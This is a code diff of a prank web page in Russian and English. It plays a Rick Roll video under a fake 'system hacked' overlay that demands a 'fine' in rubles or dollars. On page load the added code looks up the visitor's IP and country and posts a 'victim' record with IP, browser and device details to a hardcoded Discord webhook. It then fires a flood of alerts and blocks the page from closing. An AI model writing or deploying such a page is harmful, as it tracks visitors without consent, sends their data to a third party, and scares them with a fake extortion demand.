@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ОШИБКА СИСТЕМЫ</title>
+    <title>SYSTEM ERROR / ОШИБКА СИСТЕМЫ</title>
     <style>
         html, body {
             margin: 0; padding: 0; height: 100%;
@@ -54,12 +54,14 @@
 </head>
 <body>
     <div id="glitch-overlay"></div>
+    
     <div id="virus-overlay">
-        <h1>💀 СИСТЕМА ВЗЛОМАНА 💀</h1>
-        <p>Обнаружено мошенничество. Доступ к устройству получен.</p>
-        <p style="color: #ff6666; margin-top: 15px;">Требуется немедленная оплата штрафа для разблокировки.</p>
-        <button id="pay-btn">ОПЛАТИТЬ ШТРАФ (228₽)</button>
+        <h1 id="title-text">💀 СИСТЕМА ВЗЛОМАНА 💀</h1>
+        <p id="desc-text">Обнаружено мошенничество. Доступ к устройству получен.</p>
+        <p id="req-text" style="color: #ff6666; margin-top: 15px;">Требуется немедленная оплата штрафа для разблокировки.</p>
+        <button id="pay-btn">ОПЛАТИТЬ ШТРАФ (5000₽)</button>
     </div>
+    
     <video id="vid" playsinline webkit-playsinline preload="auto" muted>
         <source src="Rick_Roll_Video_Meme_Template_V1.mp4" type="video/mp4">
     </video>
@@ -72,42 +74,67 @@
             const virusOverlay = document.getElementById('virus-overlay');
             const glitchOverlay = document.getElementById('glitch-overlay');
             const payBtn = document.getElementById('pay-btn');
+            const titleText = document.getElementById('title-text');
+            const descText = document.getElementById('desc-text');
+            const reqText = document.getElementById('req-text');
             let started = false;
 
             function start() {
                 if (started) return;
                 started = true;
 
-                // 1. СРАЗУ ОТПРАВЛЯЕМ ДАННЫЕ (пока браузер не начал сходить с ума)
-                const payload = JSON.stringify({
-                    content: `🚨 **ЖЕРТВА**\n**Платформа:** ${navigator.platform}\n**Экран:** ${window.screen.width}x${window.screen.height}\n**Язык:** ${navigator.language}\n**Браузер:** ${navigator.userAgent}`
-                });
-
-                fetch("https://discordapp.com/api/webhooks/1563254919576682669/PwavQljrqSqvBos2q-mrwAJdMQru-OFgNfhYbKZKuujbIvhJzBgWH1tmGR1Qkxdz401w", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: payload,
-                    keepalive: true
-                }).catch(e => console.log("Ошибка отправки", e));
-
-                // Попытка получить IP отдельно
+                // 1. ОТПРАВЛЯЕМ ДАННЫЕ СРАЗУ
                 fetch('https://api.ipify.org?format=json')
                     .then(res => res.json())
                     .then(data => {
-                        const ipPayload = JSON.stringify({
-                            content: `🌐 **IP-АДРЕС ЖЕРТВЫ:** ${data.ip}`
+                        const ip = data.ip;
+                        // Проверяем страну через бесплатное API
+                        return fetch(`https://ipapi.co/${ip}/json/`);
+                    })
+                    .then(res => res.json())
+                    .then(data => {
+                        const country = data.country_code || "Unknown";
+                        const isRussia = (country === "RU");
+                        
+                        // Меняем текст в зависимости от страны
+                        if (isRussia) {
+                            titleText.innerText = "💀 СИСТЕМА ВЗЛОМАНА 💀";
+                            descText.innerText = "Обнаружено мошенничество. Доступ к устройству получен.";
+                            reqText.innerText = "Требуется немедленная оплата штрафа для разблокировки.";
+                            payBtn.innerText = "ОПЛАТИТЬ ШТРАФ (5000₽)";
+                        } else {
+                            titleText.innerText = "💀 SYSTEM HACKED 💀";
+                            descText.innerText = "Fraud detected. Access to device obtained.";
+                            reqText.innerText = "Immediate payment required to unlock.";
+                            payBtn.innerText = "PAY FINE ($50)";
+                        }
+
+                        // Отправляем лог в Дискорд
+                        const payload = JSON.stringify({
+                            content: `🚨 **ЖЕРТВА / VICTIM**\n**Страна / Country:** ${country} (${data.country_name})\n**IP:** ${data.ip}\n**Платформа:** ${navigator.platform}\n**Экран:** ${window.screen.width}x${window.screen.height}\n**Язык:** ${navigator.language}\n**Браузер:** ${navigator.userAgent}`
                         });
                         fetch("https://discordapp.com/api/webhooks/1563254919576682669/PwavQljrqSqvBos2q-mrwAJdMQru-OFgNfhYbKZKuujbIvhJzBgWH1tmGR1Qkxdz401w", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
-                            body: ipPayload,
+                            body: payload,
                             keepalive: true
                         }).catch(e => console.log(e));
-                    }).catch(e => console.log(e));
+                    })
+                    .catch(() => {
+                        // Если API стран не работает, отправляем базовый лог
+                        const payload = JSON.stringify({
+                            content: `🚨 **ЖЕРТВА**\n**IP:** Скрыт\n**Платформа:** ${navigator.platform}\n**Экран:** ${window.screen.width}x${window.screen.height}`
+                        });
+                        fetch("https://discordapp.com/api/webhooks/1563254919576682669/PwavQljrqSqvBos2q-mrwAJdMQru-OFgNfhYbKZKuujbIvhJzBgWH1tmGR1Qkxdz401w", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: payload,
+                            keepalive: true
+                        }).catch(e => console.log(e));
+                    });
 
-                // 2. НАЧИНАЕМ РАЗЪЁБ
+                // 2. ЗАПУСКАЕМ ВИЗУАЛЬНЫЙ И ЗВУКОВОЙ РАЗЪЁБ
                 let isNuke = Math.random() > 0.5;
-
                 vid.classList.add('shake');
                 glitchOverlay.style.display = 'block';
                 hint.classList.add('hidden');
@@ -124,14 +151,16 @@
                 payBtn.addEventListener('click', function() {
                     let count = 0;
                     while (count < 50) {
-                        setTimeout(() => { alert("ОШИБКА: ОПЛАТА НЕ ПРОШЛА. ПОВТОРИТЕ ПОПЫТКУ."); }, count * 100);
+                        setTimeout(() => { 
+                            alert(document.documentElement.lang === 'ru' ? "ОШИБКА: ОПЛАТА НЕ ПРОШЛА." : "ERROR: PAYMENT FAILED."); 
+                        }, count * 100);
                         count++;
                     }
                 });
 
                 window.onbeforeunload = function(e) {
                     e.preventDefault();
-                    e.returnValue = "Данные переданы. Закрытие страницы заблокировано.";
+                    e.returnValue = "Данные переданы. Закрытие страницы заблокировано. / Data sent. Closing blocked.";
                     return e.returnValue;
                 };
 
